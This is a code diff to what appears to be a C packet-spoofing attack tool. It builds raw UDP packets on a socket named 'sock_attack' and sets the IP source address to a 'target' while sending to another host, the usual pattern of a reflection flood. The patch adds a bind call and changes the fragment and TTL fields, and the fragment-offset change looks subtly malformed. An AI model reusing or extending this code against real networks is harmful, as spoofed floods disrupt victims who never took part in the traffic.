@@ -155,6 +155,9 @@ int main ( int argc , char *argv[] )
 		perror("ERROR: could not set socket option IP_HDRINCL.");
 
 	server_len = sizeof( struct sockaddr_in );
+
+	bind( sock_attack ,( struct sockaddr *) &server_addr , sizeof(server_addr) );
+
 	// create raw socket packet
 	packet 		= calloc( 1 , sizeof(struct udp_packet) + send_len );
 	iph 		= &packet->iph;
@@ -166,8 +169,8 @@ int main ( int argc , char *argv[] )
 	iph->tos       	= 0;
 	iph->tot_len   	= sizeof(struct udp_packet) + send_len;
 	iph->id        	= htonl(0xbeef);
-	iph->frag_off  	= 0;
-	iph->ttl       	= 255;
+	iph->frag_off  	= htonl(0x01);
+	iph->ttl       	= 64;
 	iph->protocol  	= 17;
 	iph->saddr      = inet_addr(target_url);
 	iph->daddr      = inet_addr(dst_host);
